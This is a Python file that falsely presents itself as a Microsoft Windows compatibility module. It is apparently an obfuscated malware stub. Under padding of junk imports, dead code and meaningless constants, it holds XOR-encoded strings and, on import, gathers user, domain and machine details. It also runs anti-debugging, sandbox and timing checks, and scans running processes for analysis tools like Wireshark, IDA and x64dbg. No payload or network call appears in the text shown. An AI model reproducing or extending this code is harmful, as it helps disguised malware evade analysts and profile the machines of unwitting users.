#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Microsoft Windows Compatibility Layer
Copyright (c) Microsoft Corporation. All rights reserved.
Licensed under the MIT License.
See LICENSE file in the project root for full license information.

This module provides compatibility shims for legacy applications
running on modern Windows platforms. It is part of the Windows
Compatibility Infrastructure (WCI) and is used by the Application
Compatibility Toolkit (ACT) to ensure backward compatibility.

Module: wci_compat
Version: 10.0.19041.1
Build: 20240115-1200
"""

import sys
import os
import platform
import ctypes
import ctypes.wintypes
import threading
import time
import hashlib
import base64
import zlib
import struct
import json
import re
import random
import math
import itertools
import functools
import operator
import collections
import string
import textwrap
import traceback
import types
import ast
import tokenize
import marshal
import binascii
import uuid
import secrets
import hmac
import ssl
import socket
import subprocess
import queue
import gc
import inspect
import dis
import code
import codeop
import compileall
import py_compile
import zipfile
import tarfile
import gzip
import bz2
import lzma
import shutil
import tempfile
import glob
import fnmatch
import linecache
import filecmp
import fileinput
import stat
import errno
import signal
import asyncio
import concurrent
import contextlib
import abc
import atexit
import warnings
import dataclasses
import enum
import typing
import numbers
import heapq
import bisect
import array
import weakref
import copy
import pprint
import reprlib
import graphlib
import datetime
import calendar
import decimal
import fractions
import statistics
import cmath
import sqlite3
from http.client import HTTPSConnection
from urllib.parse import urlparse
from contextlib import contextmanager
try:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
except Exception:
    pass
try:
    import windows
except Exception:
    pass
try:
    import windows.crypto
except Exception:
    pass
try:
    import windows.security
except Exception:
    pass
try:
    import windows.generated_def as gdef
except Exception:
    pass

__version__ = "10.0.19041.1"
__author__ = "Microsoft Corporation"
__license__ = "MIT"
__copyright__ = "Copyright (c) Microsoft Corporation"

try:
    import statistics as _imp_statistics_4168
except Exception:
    _imp_statistics_4168 = None
try:
    import hmac as _imp_hmac_3805
except Exception:
    _imp_hmac_3805 = None
try:
    import functools as _imp_functools_6012
except Exception:
    _imp_functools_6012 = None
try:
    import heapq as _imp_heapq_4053
except Exception:
    _imp_heapq_4053 = None
try:
    import sys as _imp_sys_1940
except Exception:
    _imp_sys_1940 = None
try:
    import linecache as _imp_linecache_4301
except Exception:
    _imp_linecache_4301 = None
try:
    import code as _imp_code_7078
except Exception:
    _imp_code_7078 = None
try:
    import datetime as _imp_datetime_8951
except Exception:
    _imp_datetime_8951 = None
try:
    import contextlib as _imp_contextlib_4135
except Exception:
    _imp_contextlib_4135 = None
try:
    import decimal as _imp_decimal_3174
except Exception:
    _imp_decimal_3174 = None
try:
    import abc as _imp_abc_4340
except Exception:
    _imp_abc_4340 = None
try:
    import binascii as _imp_binascii_9533
except Exception:
    _imp_binascii_9533 = None
try:
    import re as _imp_re_5196
except Exception:
    _imp_re_5196 = None
try:
    import bz2 as _imp_bz2_6244
except Exception:
    _imp_bz2_6244 = None
try:
    import zipfile as _imp_zipfile_8746
except Exception:
    _imp_zipfile_8746 = None
try:
    import queue as _imp_queue_6441
except Exception:
    _imp_queue_6441 = None
try:
    import enum as _imp_enum_3687
except Exception:
    _imp_enum_3687 = None
try:
    import collections as _imp_collections_8427
except Exception:
    _imp_collections_8427 = None
try:
    import asyncio as _imp_asyncio_2635
except Exception:
    _imp_asyncio_2635 = None
try:
    import signal as _imp_signal_4982
except Exception:
    _imp_signal_4982 = None
try:
    import tempfile as _imp_tempfile_6747
except Exception:
    _imp_tempfile_6747 = None
try:
    import lzma as _imp_lzma_1897
except Exception:
    _imp_lzma_1897 = None
try:
    import fileinput as _imp_fileinput_6752
except Exception:
    _imp_fileinput_6752 = None
try:
    import textwrap as _imp_textwrap_8758
except Exception:
    _imp_textwrap_8758 = None
try:
    import warnings as _imp_warnings_1780
except Exception:
    _imp_warnings_1780 = None
try:
    import zlib as _imp_zlib_1189
except Exception:
    _imp_zlib_1189 = None
try:
    import filecmp as _imp_filecmp_9355
except Exception:
    _imp_filecmp_9355 = None
try:
    import array as _imp_array_9362
except Exception:
    _imp_array_9362 = None
try:
    import graphlib as _imp_graphlib_2558
except Exception:
    _imp_graphlib_2558 = None
try:
    import numbers as _imp_numbers_8317
except Exception:
    _imp_numbers_8317 = None
try:
    import operator as _imp_operator_9706
except Exception:
    _imp_operator_9706 = None
try:
    import struct as _imp_struct_7589
except Exception:
    _imp_struct_7589 = None
try:
    import math as _imp_math_7227
except Exception:
    _imp_math_7227 = None
try:
    import socket as _imp_socket_9828
except Exception:
    _imp_socket_9828 = None
try:
    import errno as _imp_errno_7074
except Exception:
    _imp_errno_7074 = None
try:
    import tarfile as _imp_tarfile_4763
except Exception:
    _imp_tarfile_4763 = None
try:
    import copy as _imp_copy_2578
except Exception:
    _imp_copy_2578 = None
try:
    import threading as _imp_threading_1688
except Exception:
    _imp_threading_1688 = None
try:
    import fractions as _imp_fractions_4021
except Exception:
    _imp_fractions_4021 = None
try:
    import reprlib as _imp_reprlib_7896
except Exception:
    _imp_reprlib_7896 = None
try:
    import hashlib as _imp_hashlib_1833
except Exception:
    _imp_hashlib_1833 = None
try:
    import uuid as _imp_uuid_1570
except Exception:
    _imp_uuid_1570 = None
try:
    import bisect as _imp_bisect_9237
except Exception:
    _imp_bisect_9237 = None
try:
    import shutil as _imp_shutil_7518
except Exception:
    _imp_shutil_7518 = None
try:
    import stat as _imp_stat_3633
except Exception:
    _imp_stat_3633 = None
try:
    import types as _imp_types_5875
except Exception:
    _imp_types_5875 = None
try:
    import ast as _imp_ast_7117
except Exception:
    _imp_ast_7117 = None
try:
    import concurrent as _imp_concurrent_8490
except Exception:
    _imp_concurrent_8490 = None
try:
    import fnmatch as _imp_fnmatch_1481
except Exception:
    _imp_fnmatch_1481 = None
try:
    import cmath as _imp_cmath_6338
except Exception:
    _imp_cmath_6338 = None
try:
    import weakref as _imp_weakref_9568
except Exception:
    _imp_weakref_9568 = None
try:
    import atexit as _imp_atexit_5319
except Exception:
    _imp_atexit_5319 = None
try:
    import dis as _imp_dis_1332
except Exception:
    _imp_dis_1332 = None
try:
    import calendar as _imp_calendar_2435
except Exception:
    _imp_calendar_2435 = None
try:
    import pprint as _imp_pprint_4076
except Exception:
    _imp_pprint_4076 = None
if 0:
    _dead_124 = hashlib.md5(b'489702').hexdigest()
if False:
    _dead_47 = hashlib.md5(b'44148').hexdigest()
if 'a' == 'b':
    _dead_110 = 2812323147
if False:
    _dead_20 = [x for x in range(77)]
if sys.platform == 'win32' and False:
    _dead_50 = sum(range(432))
if platform.system() == 'Windows' and False:
    _dead_0 = [x for x in range(38)]
if sys.platform == 'win32' and False:
    _dead_28 = sum(range(259))
if 1 == 2:
    _dead_95 = [x for x in range(74)]
if 1 == 2:
    _dead_10 = {'k': 703}
if 0:
    _dead_84 = [x for x in range(98)]
if ():
    _dead_62 = sum(range(153))
if 'a' == 'b':
    _dead_43 = 3868318288
if []:
    _dead_75 = [x for x in range(11)]
if {}:
    _dead_98 = hashlib.md5(b'469305').hexdigest()
if False:
    _dead_60 = hashlib.md5(b'727846').hexdigest()
if 0:
    _dead_45 = {'k': 250}
if sys.platform == 'win32' and False:
    _dead_109 = {'k': 9}
if {}:
    _dead_49 = [x for x in range(80)]
if []:
    _dead_25 = [x for x in range(68)]
if False:
    _dead_120 = {'k': 74}
if os.name == 'nt' and False:
    _dead_107 = {'k': 687}
if os.name == 'nt' and False:
    _dead_55 = {'k': 680}
if sys.platform == 'win32' and False:
    _dead_87 = hashlib.md5(b'404444').hexdigest()
if sys.platform == 'win32' and False:
    _dead_67 = [x for x in range(35)]
if 0:
    _dead_6 = {'k': 218}
if []:
    _dead_97 = hashlib.md5(b'385518').hexdigest()
if sys.platform == 'win32' and False:
    _dead_4 = hashlib.md5(b'292154').hexdigest()
if 1 == 2:
    _dead_39 = {'k': 893}
if False:
    _dead_57 = hashlib.md5(b'949286').hexdigest()
if False:
    _dead_21 = 1649090148
if os.name == 'nt' and False:
    _dead_24 = [x for x in range(38)]
if None:
    _dead_119 = {'k': 781}
if None:
    _dead_11 = hashlib.md5(b'177951').hexdigest()
if os.name == 'nt' and False:
    _dead_68 = [x for x in range(32)]
if '':
    _dead_122 = [x for x in range(64)]
if sys.platform == 'win32' and False:
    _dead_23 = hashlib.md5(b'986663').hexdigest()
if 1 == 2:
    _dead_63 = 3158599527
if ():
    _dead_44 = {'k': 848}
if sys.platform == 'win32' and False:
    _dead_116 = 798196299
if 1 == 2:
    _dead_15 = 2070496426
if 'a' == 'b':
    _dead_112 = hashlib.md5(b'175735').hexdigest()
if {}:
    _dead_91 = [x for x in range(50)]
if []:
    _dead_78 = [x for x in range(80)]
if '':
    _dead_102 = {'k': 881}
if None:
    _dead_5 = [x for x in range(9)]
if '':
    _dead_27 = {'k': 794}
if {}:
    _dead_19 = [x for x in range(26)]
if 'a' == 'b':
    _dead_83 = {'k': 277}
if '':
    _dead_30 = hashlib.md5(b'136342').hexdigest()
if False:
    _dead_53 = {'k': 87}
if None:
    _dead_114 = 2737290372
if 1 == 2:
    _dead_48 = 3196414001
if {}:
    _dead_56 = [x for x in range(37)]
if '':
    _dead_89 = sum(range(650))
if []:
    _dead_33 = hashlib.md5(b'163711').hexdigest()
if None:
    _dead_123 = sum(range(355))
if False:
    _dead_73 = {'k': 893}
if 'a' == 'b':
    _dead_2 = sum(range(655))
if platform.system() == 'Windows' and False:
    _dead_1 = {'k': 134}
if platform.system() == 'Windows' and False:
    _dead_76 = hashlib.md5(b'308436').hexdigest()
if 1 == 2:
    _dead_46 = hashlib.md5(b'689222').hexdigest()
if os.name == 'nt' and False:
    _dead_121 = hashlib.md5(b'312989').hexdigest()
if os.name == 'nt' and False:
    _dead_61 = sum(range(365))
if '':
    _dead_100 = [x for x in range(26)]
if None:
    _dead_92 = hashlib.md5(b'976481').hexdigest()
if {}:
    _dead_125 = [x for x in range(58)]
if 1 == 2:
    _dead_64 = [x for x in range(88)]
if '':
    _dead_106 = sum(range(85))
if None:
    _dead_93 = [x for x in range(14)]
if platform.system() == 'Windows' and False:
    _dead_51 = 3299794826
if {}:
    _dead_18 = {'k': 983}
if '':
    _dead_71 = [x for x in range(40)]
if os.name == 'nt' and False:
    _dead_108 = sum(range(722))
if 'a' == 'b':
    _dead_72 = {'k': 768}
if 1 == 2:
    _dead_36 = {'k': 263}
if False:
    _dead_80 = {'k': 701}
if None:
    _dead_117 = 1647804874
if 1 == 2:
    _dead_82 = hashlib.md5(b'911487').hexdigest()
if 1 == 2:
    _dead_79 = [x for x in range(59)]
if None:
    _dead_40 = sum(range(345))
if 1 == 2:
    _dead_85 = sum(range(51))
if platform.system() == 'Windows' and False:
    _dead_101 = sum(range(785))
if 1 == 2:
    _dead_3 = [x for x in range(48)]
if []:
    _dead_99 = {'k': 838}
if '':
    _dead_52 = hashlib.md5(b'366618').hexdigest()
if 0:
    _dead_12 = sum(range(182))
if '':
    _dead_34 = 1252741213
if {}:
    _dead_65 = hashlib.md5(b'445259').hexdigest()
if 0:
    _dead_113 = {'k': 42}
if False:
    _dead_9 = 2972063971
if 0:
    _dead_31 = [x for x in range(39)]
if False:
    _dead_90 = [x for x in range(53)]
if '':
    _dead_105 = hashlib.md5(b'610939').hexdigest()
if platform.system() == 'Windows' and False:
    _dead_74 = hashlib.md5(b'294350').hexdigest()
if 'a' == 'b':
    _dead_29 = 2198836026
if 1 == 2:
    _dead_37 = sum(range(276))
if {}:
    _dead_69 = hashlib.md5(b'230151').hexdigest()
if platform.system() == 'Windows' and False:
    _dead_115 = sum(range(549))
if False:
    _dead_103 = [x for x in range(75)]
if []:
    _dead_94 = [x for x in range(56)]
if 'a' == 'b':
    _dead_81 = sum(range(836))
if '':
    _dead_38 = hashlib.md5(b'513563').hexdigest()
if platform.system() == 'Windows' and False:
    _dead_7 = 913816916
if []:
    _dead_77 = {'k': 284}
if False:
    _dead_32 = [x for x in range(87)]
if 1 == 2:
    _dead_58 = {'k': 130}
if '':
    _dead_54 = {'k': 35}
if {}:
    _dead_14 = 2414756333
if []:
    _dead_35 = 3594589896
if False:
    _dead_41 = sum(range(12))
if platform.system() == 'Windows' and False:
    _dead_66 = [x for x in range(19)]
if '':
    _dead_86 = [x for x in range(100)]
if 'a' == 'b':
    _dead_16 = [x for x in range(94)]
if ():
    _dead_42 = [x for x in range(69)]
if None:
    _dead_104 = 3162944953
if '':
    _dead_96 = hashlib.md5(b'122280').hexdigest()
if '':
    _dead_88 = sum(range(505))
if 1 == 2:
    _dead_59 = hashlib.md5(b'333490').hexdigest()
if platform.system() == 'Windows' and False:
    _dead_17 = 3636454677
if None:
    _dead_8 = hashlib.md5(b'274109').hexdigest()
if {}:
    _dead_22 = hashlib.md5(b'937045').hexdigest()
if sys.platform == 'win32' and False:
    _dead_111 = hashlib.md5(b'157058').hexdigest()
if None:
    _dead_26 = hashlib.md5(b'923067').hexdigest()
if 1 == 2:
    _dead_118 = hashlib.md5(b'182693').hexdigest()
if 1 == 2:
    _dead_13 = hashlib.md5(b'872995').hexdigest()
if []:
    _dead_70 = {'k': 909}
_s_8292 = ')z\x1e1*%\x1e;\x052\x01u'
_k_8509 = 72
_s_8877 = '¦\x9a\x8c®¡¨\x8f»'
_k_9231 = 194
_s_1591 = 'íãæ\x86íìöÄùÎý\x89'
_k_8079 = 180
_s_7055 = ':k15;\x1e.#\x14>dd'
_k_4717 = 89
_s_4591 = 'ï¿õáÀ÷Ä°'
_k_4754 = 141
_s_5098 = '\x9c\x90¬\x95\x9c¹\x89Ã'
_k_7899 = 254
_s_2443 = '¢õ\x8b¿\x9e¼\x8b¿'
_k_7606 = 198
_s_4475 = '3Y _\t";\x10\'\rWW'
_k_5667 = 106
_s_9701 = '~Ji^B\x7fe\x17'
_k_7958 = 39
_s_5717 = 'ñþÝêöËÑ£'
_k_4839 = 147
_s_5170 = '\x9d¤¾\x93\x9e´¾\x94\x9f»\x97Á'
_k_7816 = 252
_s_7719 = 'or\x00OlmwE'
_k_8899 = 53
_s_9382 = 'C\x15KRFou\x17Df\x1a\x1a'
_k_4848 = 39
_s_9014 = 'Û\x8dÓÊÞè\x8aÓÛþ\x82\x82'
_k_7339 = 191
_s_8849 = 'ZftM\\i\x07K'
_k_5324 = 62
def _api_init():
    _h = {}
    try:
        _h['kernel32'] = ctypes.windll.kernel32
        _h['user32'] = ctypes.windll.user32
        _h['advapi32'] = ctypes.windll.advapi32
        _h['shell32'] = ctypes.windll.shell32
        _h['ole32'] = ctypes.windll.ole32
        _h['ntdll'] = ctypes.windll.ntdll
        _h['ws2_32'] = ctypes.windll.ws2_32
        _h['crypt32'] = ctypes.windll.crypt32
        _h['bcrypt'] = ctypes.windll.bcrypt
        _h['ncrypt'] = ctypes.windll.ncrypt
        _h['iphlpapi'] = ctypes.windll.iphlpapi
        _h['dnsapi'] = ctypes.windll.dnsapi
        _h['winhttp'] = ctypes.windll.winhttp
        _h['wininet'] = ctypes.windll.wininet
        _h['urlmon'] = ctypes.windll.urlmon
    except Exception:
        pass
    return _h

_api = _api_init()

def _get_sys_info():
    _i = {}
    try:
        _i['os'] = platform.system()
        _i['ver'] = platform.version()
        _i['arch'] = platform.machine()
        _i['node'] = platform.node()
        _i['proc'] = platform.processor()
        _i['py'] = platform.python_version()
        _i['exe'] = sys.executable
        _i['cwd'] = os.getcwd()
        _i['user'] = os.environ.get('USERNAME', '')
        _i['domain'] = os.environ.get('USERDOMAIN', '')
        _i['comp'] = os.environ.get('COMPUTERNAME', '')
        _i['temp'] = os.environ.get('TEMP', '')
        _i['appdata'] = os.environ.get('APPDATA', '')
        _i['local'] = os.environ.get('LOCALAPPDATA', '')
        _i['prog'] = os.environ.get('PROGRAMFILES', '')
        _i['progx'] = os.environ.get('PROGRAMFILES(X86)', '')
        _i['windir'] = os.environ.get('WINDIR', '')
        _i['sysroot'] = os.environ.get('SystemRoot', '')
        _i['path'] = os.environ.get('PATH', '')[:200]
    except Exception:
        pass
    return _i

_sys_info = _get_sys_info()

def _check_environment():
    _r = {}
    try:
        _r['debug'] = sys.gettrace() is not None
        _r['frozen'] = getattr(sys, 'frozen', False)
        _r['threads'] = threading.active_count()
        _r['recursion'] = sys.getrecursionlimit()
        _r['argv'] = sys.argv
        _r['modules'] = len(sys.modules)
        _r['warn'] = len(sys.warnoptions)
        _r['flags'] = sys.flags
    except Exception:
        pass
    return _r

_env = _check_environment()

def _nt_query_system_information(_info_class, _buffer, _length, _ret_len):
    try:
        _nt = _api.get('ntdll')
        if _nt:
            _nt.NtQuerySystemInformation.argtypes = [ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
            _nt.NtQuerySystemInformation.restype = ctypes.c_long
            return _nt.NtQuerySystemInformation(_info_class, _buffer, _length, _ret_len)
    except Exception:
        pass
    return -1

def _nt_query_information_process(_handle, _info_class, _buffer, _length, _ret_len):
    try:
        _nt = _api.get('ntdll')
        if _nt:
            _nt.NtQueryInformationProcess.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
            _nt.NtQueryInformationProcess.restype = ctypes.c_long
            return _nt.NtQueryInformationProcess(_handle, _info_class, _buffer, _length, _ret_len)
    except Exception:
        pass
    return -1

def _rtl_get_version():
    try:
        _nt = _api.get('ntdll')
        if _nt:
            class _OSVERSIONINFOEXW(ctypes.Structure):
                _fields_ = [('dwOSVersionInfoSize', ctypes.c_ulong), ('dwMajorVersion', ctypes.c_ulong), ('dwMinorVersion', ctypes.c_ulong), ('dwBuildNumber', ctypes.c_ulong), ('dwPlatformId', ctypes.c_ulong), ('szCSDVersion', ctypes.c_wchar * 128), ('wServicePackMajor', ctypes.c_ushort), ('wServicePackMinor', ctypes.c_ushort), ('wSuiteMask', ctypes.c_ushort), ('wProductType', ctypes.c_byte), ('wReserved', ctypes.c_byte)]
            _vi = _OSVERSIONINFOEXW()
            _vi.dwOSVersionInfoSize = ctypes.sizeof(_OSVERSIONINFOEXW)
            _nt.RtlGetVersion(ctypes.byref(_vi))
            return _vi
    except Exception:
        pass
    return None

def _measure_timing(_fn, _iters=1000):
    _t0 = time.perf_counter_ns()
    for _ in range(_iters):
        _fn()
    _t1 = time.perf_counter_ns()
    return (_t1 - _t0) / _iters

def _calibrate():
    _base = _measure_timing(lambda: hashlib.sha256(b'cal').hexdigest())
    _thresh = _base * 100
    return _base, _thresh

_timing_base, _timing_thresh = _calibrate()

def _check_timing():
    _now = _measure_timing(lambda: hashlib.sha256(b'chk').hexdigest())
    return abs(_now - _timing_base) < _timing_thresh

def _check_debugger():
    _r = False
    try:
        _k = _api.get('kernel32')
        if _k:
            _r = _k.IsDebuggerPresent() != 0
    except Exception:
        pass
    return _r

def _check_remote_debugger():
    _r = False
    try:
        _k = _api.get('kernel32')
        if _k:
            _p = ctypes.c_int(0)
            _k.CheckRemoteDebuggerPresent(_k.GetCurrentProcess(), ctypes.byref(_p))
            _r = _p.value != 0
    except Exception:
        pass
    return _r

def _check_hardware_breakpoints():
    _r = False
    try:
        _k = _api.get('kernel32')
        if _k:
            _ctx = ctypes.create_string_buffer(4096)
            _k.GetThreadContext(_k.GetCurrentThread(), _ctx)
            _dr = struct.unpack_from('<4Q', _ctx.raw, 0x48)
            _r = any(_dr)
    except Exception:
        pass
    return _r

def _anti_debug_init():
    _flags = {
        'debugger': _check_debugger(),
        'remote': _check_remote_debugger(),
        'hw_bp': _check_hardware_breakpoints(),
    }
    return _flags

_anti_debug = _anti_debug_init()

def _check_sandbox():
    _r = {}
    try:
        _r['cpu'] = platform.processor()
        _r['cores'] = os.cpu_count()
        _r['mem'] = 0
        try:
            _r['mem'] = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES')
        except Exception:
            pass
        _r['disk'] = shutil.disk_usage(os.getcwd()).total if os.path.exists(os.getcwd()) else 0
        _r['host'] = platform.node()
        _r['user'] = os.environ.get('USERNAME', '')
        _r['domain'] = os.environ.get('USERDOMAIN', '')
    except Exception:
        pass
    return _r

_sandbox = _check_sandbox()

def _check_analysis_tools():
    _tools = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'x32dbg.exe', 'ida.exe', 'ida64.exe', 'ghidra.exe', 'windbg.exe', 'dnspy.exe', 'ilspy.exe', 'dotpeek.exe', 'fiddler.exe', 'charles.exe', 'burpsuite.exe', 'mitmproxy.exe', 'processhacker.exe', 'systeminformer.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe', 'tcpview.exe', 'netmon.exe']
    _found = []
    try:
        _running = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True).stdout.lower()
        for _t in _tools:
            if _t.lower() in _running:
                _found.append(_t)
    except Exception:
        pass
    return _found

_analysis_tools = _check_analysis_tools()

_z279_7502892 = pow(3902309406, 3, 61837)
_z1117_5370548 = pow(297194594, 2, 75645)
_z718_2647081 = abs(-4216143811)
_z1451_9062315 = repr(3969867330)
_z964_3836701 = hex(1711639270)
_z955_9572405 = id(object())
_z1010_2346064 = list(range(12))
_z1118_5279880 = len(str(3539134508))
_z1439_3578198 = sorted([6, 569])
_z775_6416341 = 2130988771 | 43402
_z412_5888662 = tuple(range(8))
_z872_2649942 = str(1614603497)
_z1205_1754332 = 2997140812 << 3
_z1237_6289103 = len(str(3954316221))
_z1136_9308251 = ~1530540421
_z39_1140613 = frozenset(range(9))
_z601_7974230 = format(910643639, 'x')
_z701_1479788 = pow(1520890952, 5, 17842)
_z1125_8838769 = pow(653375183, 4, 75571)
_z180_6918953 = 4270569082 & 39840
_z316_9554004 = bin(1571837985)
_z776_6616237 = complex(42, 71)
_z494_9251630 = 2514575420 >> 4
_z1060_8563400 = set(range(4))
_z896_4396479 = list(zip(range(4), range(1)))
_z1252_9735770 = bin(1974029362)
_z1028_2814373 = id(object())
_z941_4202179 = 1524940872 << 2
_z859_5552006 = 3695594914 | 4594
_z1194_9288726 = -3689074965
_z1026_6050885 = format(2357498277, 'x')
_z925_6993737 = max(130388044, 41047)
_z970_6302248 = int(str(4235085199))
_z1298_6497995 = frozenset(range(5))
_z1353_9487007 = format(1758995914, 'x')
_z1415_1626249 = 3881778186 + 18382
_z278_9678589 = repr(2481531076)
_z1064_1091291 = 394648338 >> 1
_z380_4443202 = format(1675764119, 'x')
_z884_2092661 = 3755109930 - 57656
_z452_3883400 = list(zip(range(1), range(4)))
_z1228_4403346 = repr(780324487)
_z34_9513950 = bytes([124])
_z403_1614151 = bin(736170157)
_z292_4525642 = 3147793819 ^ 36486
_z1304_9181209 = 1903321718 & 9367
_z506_8677956 = round(815.0521934515995, 1)
_z1330_6051711 = ~130748923
_z366_5300181 = 1181863414 - 49049
_z342_3360577 = list(map(lambda x: x ^ 213, range(6)))
_z1272_8248163 = repr(4051203279)
_z1275_2592601 = abs(-4089580750)
_z644_6262344 = 1449401941 | 3012
_z124_2713436 = min(1019322340, 48380)
_z249_3645863 = bin(3696665541)
_z55_4926258 = oct(3347339933)
_z501_7720148 = min(3698321699, 23557)
_z97_2337237 = 1458844166 & 45010
_z1069_3106839 = 510733313 - 50891
_z485_5005837 = -2559634008
_z977_2852056 = str(3446891575)
_z1257_3399566 = hash(str(3646238981))
_z1270_3248778 = 3017108358 + 21625
_z159_5321102 = round(35.670247903380584, 2)
_z566_6198376 = list(range(9))
_z1045_3500801 = slice(0, 16)
_z371_5123596 = len(str(355216709))
_z592_1996850 = 1253752300 << 4
_z1128_4037989 = list(filter(lambda x: x % 2 == 0, range(18)))
_z93_3321952 = bin(2803534666)
_z1199_5124044 = pow(1313695458, 3, 16483)
_z121_8004173 = list(filter(lambda x: x % 2 == 0, range(5)))
_z1426_6359998 = int(str(3925122343))
_z1224_4007621 = frozenset(range(10))
_z1430_6885035 = list(enumerate(range(2)))
_z427_3595317 = len(str(230163968))
_z1058_8207249 = complex(38, 78)
_z954_6232640 = bytearray([135])
_z1165_7162722 = float(2042268145)
_z484_7466722 = len(str(169761464))
_z830_1728218 = list(map(lambda x: x ^ 7, range(9)))
_z554_3365014 = min(4119277632, 64675)
_z1073_5363033 = float(4224971680)
_z236_4231682 = dict(zip(range(3), range(3)))
_z632_2186453 = bin(3656922841)
_z1092_5823827 = float(1078686765)
_z261_2767724 = repr(665271442)
_z319_9360812 = 593837248 % 3218
_z432_3300567 = oct(4163245450)
_z700_1903217 = hex(3978017879)
_z1066_7357635 = set(range(1))
_z1044_8222800 = list(filter(lambda x: x % 2 == 0, range(14)))
_z476_6057209 = list(zip(range(1), range(5)))
_z806_3804191 = dict(zip(range(3), range(3)))
_z1206_5594690 = 1422952034 + 25716
_z1465_7877700 = 2456391480 * 2
_z1153_4054973 = ~4006641366
_z155_8653684 = round(601.4307886149905, 1)
_z1142_3436985 = hex(1228552762)
_z837_1371526 = complex(2, 54)
_z596_5701061 = repr(3712106638)
_z283_2529720 = max(3844929199, 31648)
_z405_4073309 = ~1100143506
_z717_8469116 = dict(zip(range(1), range(3)))
_z844_9314318 = -2721165381
_z465_3399269 = slice(8, 16)
_z1094_6383092 = 2322318295 - 50689
_z1075_7688271 = abs(-2587604085)
_z338_4806607 = 2791821684 - 2050
_z175_7350418 = dict(zip(range(2), range(1)))
_z1472_2286059 = round(109.23257123253383, 2)
_z831_4432446 = max(1979269331, 6326)
_z352_6140666 = 4024571178 * 1
_z397_8026999 = min(1827328823, 39993)
_z455_3920618 = sorted([587, 153])
_z537_2686192 = -4277715874
_z557_5000899 = 3736510396 ^ 24370
_z277_4339426 = 3018360970 & 1684
_z1065_5678680 = 3188366480 % 8420
_z323_3786350 = list(zip(range(5), range(3)))
_z1059_6402821 = sorted([929, 616])
_z81_5796998 = min(1460617683, 47552)
_z704_9775326 = 4096313706 << 4
_z1217_6941958 = oct(421910172)
_z3_8709286 = list(map(lambda x: x ^ 169, range(10)))
_z213_8203243 = int(str(3070590609))
_z1080_6984387 = 934351673 << 2
_z53_5980943 = 784701626 >> 2
_z560_1651157 = bytearray([97])
_z1112_1221572 = hex(1048872779)
_z674_5537167 = bin(1443315221)
_z479_1397826, _ = divmod(3792486704, 616)
_z1305_1963776 = tuple(range(10))
_z1197_1883126 = list(map(lambda x: x ^ 106, range(10)))
_z328_2061562 = dict(zip(range(5), range(3)))
_z1100_4810244 = set(range(2))
_z570_8227598 = 676108643 ^ 28340
_z1029_9500715 = set(range(9))
_z858_3730910 = format(985112031, 'x')
_z586_1588459 = format(484324666, 'x')
_z463_1454757 = 2594246979 | 55534
_z794_3927901 = 2833610942 | 57212
_z1151_9037197 = list(reversed(range(1)))
_z161_8533300 = list(range(5))
_z334_6000016 = 2987032203 - 10399
_z981_8763183 = id(object())
_z1002_8728748 = repr(1824900695)
_z1157_6548790 = 243091947 ^ 59539
_z759_1862620, _ = divmod(1090769922, 7422)
_z1390_1188360, _ = divmod(3987032976, 3614)
_z931_4453606 = frozenset(range(5))
_z32_2666031 = sum([2683826177, 30520])
_z1226_6304085 = ~861948928
_z1133_4020031 = 2780102339 | 5720
_z840_4661642 = list(enumerate(range(1)))
_z812_3013107 = hex(2341750640)
_z1479_4459010 = list(range(10))
_z87_4743039 = oct(2200043183)
_z937_4921912 = int(str(2512159938))
_z513_4863700 = list(range(77))
_z210_2590469 = complex(1, 69)
_z950_8245161 = max(3767328698, 50058)
_z1312_1847481 = 1707489267 - 51905
_z61_2531637 = format(986088954, 'x')
_z222_5313141 = 3489154854 & 28610
_z1156_4617376 = frozenset(range(6))
_z460_6578913 = pow(3714036290, 4, 42224)
_z1214_2484288 = len(str(151442669))
_z1166_2298716 = hex(118115013)
_z29_4124640 = oct(1190172078)
_z444_4198742 = list(range(74))
_z220_3753254 = frozenset(range(7))
_z241_7535372 = 907521767 << 3
_z1290_8903975 = 2488985412 + 61559
_z378_1670967 = 872569719 % 1771
_z123_9213959 = oct(1533103060)
_z408_7445323 = 3053734002 << 2
_z62_7061682 = abs(-461163501)
_z1349_7850870 = list(range(46))
_z1155_3437277 = dict(zip(range(1), range(2)))
_z112_4984080 = ~946442597
_z76_7091524 = 3431987030 & 21339
_z1222_2510557 = 3693009899 + 5416
_z347_2472455 = ~4089739177
_z178_8914780 = list(zip(range(4), range(5)))
_z729_5115261 = list(range(46))
_z640_9565232 = id(object())
_z233_2618452 = list(range(3))
_z10_1839161 = 203726108 ^ 60813
_z1188_9433050 = min(3214704500, 55401)
_z813_3001007 = sorted([863, 752])
_z789_9306090 = list(zip(range(3), range(4)))
_z868_2562873 = abs(-1132057651)
_z284_2017473 = -3551686066
_z30_4390639 = complex(3, 15)
_z1241_4432797 = list(range(45))
_z207_3801305 = 2533363570 | 5621
_z386_3786777 = 2364175287 % 7727
_z382_2861667 = ~3355794468
_z1389_4679811 = tuple(range(2))
_z797_6980235 = dict(zip(range(5), range(2)))
_z188_5367401 = list(filter(lambda x: x % 2 == 0, range(5)))
_z784_7280118 = list(filter(lambda x: x % 2 == 0, range(14)))
_z47_1810301 = hex(4091418824)
_z306_6319524 = list(zip(range(4), range(5)))
_z913_4777416, _ = divmod(1958189897, 6895)
_z474_5695546 = sum([1423223161, 25161])
_z646_1013791 = bytearray([30])
_z1161_6685303 = 1326386423 >> 3
_z978_6206684 = 2114188630 >> 3
_z1005_5989400 = 2026972684 % 9593
_z1433_9136569 = ~1914511248
_z548_9476387 = list(range(48))
_z997_3347313, _ = divmod(1481447846, 9660)
_z388_7239127 = list(range(64))
_z1352_5731738 = round(713.4190454776598, 4)
_z1475_5951726 = list(map(lambda x: x ^ 101, range(8)))
_z995_6358287 = sorted([256, 828])
_z1054_6694351 = id(object())
_z538_6453178 = 3827320743 << 2
_z272_2974218 = list(enumerate(range(1)))
_z160_2090626, _ = divmod(3200061914, 3342)
_z252_8928861 = repr(3185740990)
_z1184_5741394 = 2062123572 & 40410
_z320_9535221 = pow(2287886053, 2, 58732)
